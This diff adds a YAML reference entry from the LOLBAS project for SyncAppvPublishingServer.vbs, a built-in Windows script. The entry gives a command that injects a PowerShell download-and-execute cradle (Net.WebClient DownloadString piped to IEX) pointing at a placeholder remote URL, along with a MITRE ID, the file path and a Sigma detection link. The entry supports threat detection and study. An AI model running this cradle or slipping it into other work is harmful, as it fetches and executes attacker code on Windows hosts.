@@ -1,0 +1,28 @@
+<!-- source: https://github.com/LOLBAS-Project/LOLBAS/blob/a2784c79091cb282fefb68f0056a853cfafd7e3c/yml/OSScripts/Syncappvpublishingserver.yml -->
+---
+Name: Syncappvpublishingserver.vbs
+Description: Script used related to app-v and publishing server
+Author: Oddvar Moe
+Created: 2018-05-25
+Commands:
+  - Command: SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX"
+    Description: Inject PowerShell script code with the provided arguments
+    Usecase: Use Powershell host invoked from vbs script
+    Category: Execute
+    Privileges: User
+    MitreID: T1216.002
+    OperatingSystem: Windows 10, Windows 11
+    Tags:
+      - Execute: PowerShell
+Full_Path:
+  - Path: C:\Windows\System32\SyncAppvPublishingServer.vbs
+Detection:
+  - Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_syncappvpublishingserver_vbs_execute_psh.yml
+Resources:
+  - Link: https://twitter.com/monoxgas/status/895045566090010624
+  - Link: https://twitter.com/subTee/status/855738126882316288
+Acknowledgement:
+  - Person: Nick Landers
+    Handle: '@monoxgas'
+  - Person: Casey Smith
+    Handle: '@subtee'
